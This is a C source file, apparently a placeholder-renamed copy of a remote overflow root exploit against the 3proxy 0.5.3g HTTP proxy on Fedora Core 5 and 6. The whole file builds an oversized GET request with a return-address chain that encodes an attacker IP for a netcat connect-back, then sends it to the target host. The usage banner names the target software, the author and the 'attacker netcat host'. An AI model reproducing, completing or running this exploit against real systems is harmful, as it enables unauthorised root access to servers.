
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int u_long ;
struct in_addr {int dummy; } ;
struct sockaddr_in {int sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int host ;
typedef int do_ex ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 int VAR_16 ;
 int VAR_17 ;
 int VAR_18 ;
 int VAR_19 ;
 int VAR_20 ;
 int VAR_21 ;
 int VAR_22 ;
 int VAR_23 ;
 int VAR_24 ;
 int VAR_25 ;
 int VAR_26 ;
 int VAR_27 ;
 int VAR_28 ;
 int VAR_29 ;
 int VAR_30 ;
 int VAR_31 ;
 int VAR_32 ;
 int VAR_33 ;
 int VAR_34 ;
 int FUNC_0 (unsigned char*,int,int) ;
 int FUNC_1 (char*) ;
 int FUNC_2 (int *,int) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int,struct sockaddr*,int) ;
 int FUNC_5 (int) ;
 struct hostent* FUNC_6 (char*) ;
 int FUNC_7 (int) ;
 int FUNC_8 (char*,int ,int) ;
 int FUNC_9 (char*,...) ;
 int FUNC_10 (int,unsigned char*,int,int ) ;
 int FUNC_11 (int ,int ,int ) ;
 int FUNC_12 (unsigned char*,char*,...) ;
 int FUNC_13 (char*,char*,int*,int*,int*,int*) ;
 int FUNC_14 (unsigned char*) ;
 int FUNC_15 (char*,char*,int) ;

int FUNC_16(int VAR_35,char *VAR_36[]){
 u_long VAR_37;
 u_long VAR_38;
 u_long VAR_39;
 u_long VAR_40;
 u_long VAR_41;
 u_long VAR_42;
 u_long VAR_43;
 u_long VAR_44;
 u_long VAR_45;
 u_long VAR_46;
 u_long VAR_47;
 u_long VAR_48;
 u_long VAR_49;
 u_long VAR_50;
 u_long VAR_51;

 struct hostent *VAR_52;
 struct sockaddr_in VAR_53;
 unsigned char VAR_54[4096];
 int VAR_55,VAR_56,VAR_57;
 u_long VAR_58,VAR_59,VAR_60,VAR_61,VAR_62;
 unsigned char VAR_63[256];
 char VAR_64[256];
 int VAR_65=3128;

 VAR_58=VAR_59=VAR_60=VAR_61=VAR_62;
 FUNC_8((char *)VAR_54,0,sizeof(VAR_54));

 FUNC_9("/*\n**\n** Fedora Core 5,6 (exec-shield) based\n"
  "** 3proxy HTTP Proxy (3proxy-0.5.3g.tgz) remote overflow root exploit\n"
  "** by Xpl017Elz\n**\n");
 if(VAR_35<5){
  FUNC_9("** Usage: %s [host] [port] [attacker ip] [type]\n",VAR_36[0]);
  FUNC_9("**\n** host: 3proxy HTTP Proxy server\n");
  FUNC_9("** port: default 3128\n");
  FUNC_9("** attacker ip: attacker netcat host\n");
  FUNC_9("** type: {0} - Fedora Core release 5 (Bordeaux), exec-shield default enabled.\n");
  FUNC_9("**       {1} - Fedora Core release 6 (Zod), exec-shield default enabled.\n**\n");
  FUNC_9("** Example: %s 3proxy.use_host.co.kr 3128 82.82.82.82 1\n**\n*/\n",VAR_36[0]);
  FUNC_5(-1);
 }
 if(FUNC_1(VAR_36[4])){
  VAR_37=VAR_27;
  VAR_38=VAR_19;
  VAR_39=VAR_16;
  VAR_40=VAR_20;
  VAR_41=VAR_21;
  VAR_42=VAR_25;
  VAR_43=VAR_23;
  VAR_44=VAR_24;
  VAR_45=VAR_26;
  VAR_46=VAR_17;
  VAR_47=VAR_18;
  VAR_48=VAR_29;
  VAR_49=VAR_30;
  VAR_50=VAR_22;
  VAR_51=VAR_28;
 } else {
  VAR_37=VAR_12;
  VAR_38=VAR_4;
  VAR_39=VAR_1;
  VAR_40=VAR_5;
  VAR_41=VAR_6;
  VAR_42=VAR_10;
  VAR_43=VAR_8;
  VAR_44=VAR_9;
  VAR_45=VAR_11;
  VAR_46=VAR_2;
  VAR_47=VAR_3;
  VAR_48=VAR_14;
  VAR_49=VAR_15;
  VAR_50=VAR_7;
  VAR_51=VAR_13;
 }

 FUNC_13(VAR_36[3],"%d.%d.%d.%d",&VAR_59,&VAR_60,&VAR_61,&VAR_62);



 VAR_58=0;
 VAR_58+=VAR_59 * (16777216);
 VAR_58+=VAR_60 * (65536);
 VAR_58+=VAR_61 * (256);
 VAR_58+=VAR_62;

 FUNC_8((char *)VAR_63,0,256);
 FUNC_12(VAR_63,"%10lu",VAR_58);

 FUNC_8((char *)VAR_64,0,sizeof(VAR_64));
 FUNC_15(VAR_64,VAR_36[1],sizeof(VAR_64)-1);
 VAR_65=FUNC_1(VAR_36[2]);

 VAR_52=FUNC_6(VAR_64);
 if(VAR_52==((void*)0)){
  FUNC_9("** gethostbyname() error\n**\n*/\n");
  return -1;
 }
 VAR_57=FUNC_11(VAR_0,VAR_34,0);
 if(VAR_57==-1){
  FUNC_9("** socket() error\n**\n*/\n");
  return -1;
 }

 VAR_53.sin_family=VAR_0;
 VAR_53.sin_port=FUNC_7(VAR_65);
 VAR_53.sin_addr=*((struct in_addr *)VAR_52->h_addr);
 FUNC_2(&(VAR_53.sin_zero),8);

 FUNC_9("** make exploit\n");
 FUNC_12(VAR_54,"GET /");
 VAR_56=FUNC_14(VAR_54);
 for(VAR_55=0;VAR_55<1800-444;VAR_55++,VAR_56++){
  FUNC_12(VAR_54+VAR_56,"A");
 }






 VAR_56=0;
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=0x0d0d0d0d; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=0x0d0d0d0d; VAR_55+=4;};

 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_42; VAR_55+=4;};
 VAR_56+=2;
 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_43; VAR_55+=4;};
 VAR_56+=1;
 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_45; VAR_55+=4;};
 VAR_56+=1;
 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_46; VAR_55+=4;};
 VAR_56+=2;
 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_47; VAR_55+=4;};
 VAR_56+=1;
 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_48; VAR_55+=4;};
 VAR_56+=2;
 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_49; VAR_55+=4;};
 VAR_56+=2;
 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_45; VAR_55+=4;};
 VAR_56+=1;


 for(VAR_58=0;VAR_58<10;VAR_58++){
  { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
  { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
  { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};

  switch(VAR_63[VAR_58]){
   case '0':
    { *(long *)&VAR_54[VAR_55]=VAR_41; VAR_55+=4;};
    break;
   case '1':
    { *(long *)&VAR_54[VAR_55]=VAR_41+1; VAR_55+=4;};
    break;
   case '2':
    { *(long *)&VAR_54[VAR_55]=VAR_41+2; VAR_55+=4;};
    break;
   case '3':
    { *(long *)&VAR_54[VAR_55]=VAR_41+3; VAR_55+=4;};
    break;
   case '4':
    { *(long *)&VAR_54[VAR_55]=VAR_41+4; VAR_55+=4;};
    break;
   case '5':
    { *(long *)&VAR_54[VAR_55]=VAR_41+5; VAR_55+=4;};
    break;
   case '6':
    { *(long *)&VAR_54[VAR_55]=VAR_41+6; VAR_55+=4;};
    break;
   case '7':
    { *(long *)&VAR_54[VAR_55]=VAR_41+7; VAR_55+=4;};
    break;
   case '8':
    { *(long *)&VAR_54[VAR_55]=VAR_41+8; VAR_55+=4;};
    break;
   case '9':
    { *(long *)&VAR_54[VAR_55]=VAR_41+9; VAR_55+=4;};
    break;
  }
  VAR_56+=1;
 }
 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_45; VAR_55+=4;};
 VAR_56+=1;
 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_50; VAR_55+=4;};
 VAR_56+=5;
 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_44; VAR_55+=4;};
 VAR_56+=1;

 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_40; VAR_55+=4;};

 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_40-40; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+3; VAR_55+=4;};


 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_40-40; VAR_55+=4;};
 VAR_56+=24;

 { *(long *)&VAR_54[VAR_55]=VAR_37; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_38; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39+VAR_56; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_40; VAR_55+=4;};


 { *(long *)&VAR_54[VAR_55]=VAR_51; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=0x82828282; VAR_55+=4;};
 { *(long *)&VAR_54[VAR_55]=VAR_39; VAR_55+=4;};

 FUNC_12(VAR_54+VAR_55,"\nHost: ");
 VAR_55=FUNC_14(VAR_54);
 for(VAR_56=0;VAR_56<700;VAR_56++){
  VAR_54[VAR_55++]='A';
 }
 VAR_54[VAR_55++]='\n';
 VAR_54[VAR_55++]='\n';
 FUNC_9("** total packet size: %d\n",FUNC_14(VAR_54));

 VAR_56=FUNC_4(VAR_57,(struct sockaddr *)&VAR_53,sizeof(struct sockaddr));
 if(VAR_56==-1){
  FUNC_9("** connect() error\n**\n*/\n");
  return -1;
 }
 else {
  FUNC_9("** send exploit\n");
  FUNC_10(VAR_57,VAR_54,VAR_55,0);
 }
 FUNC_3(VAR_57);
 FUNC_9("** attacker host, check it up, now!\n**\n*/\n");
 FUNC_5(0);
}
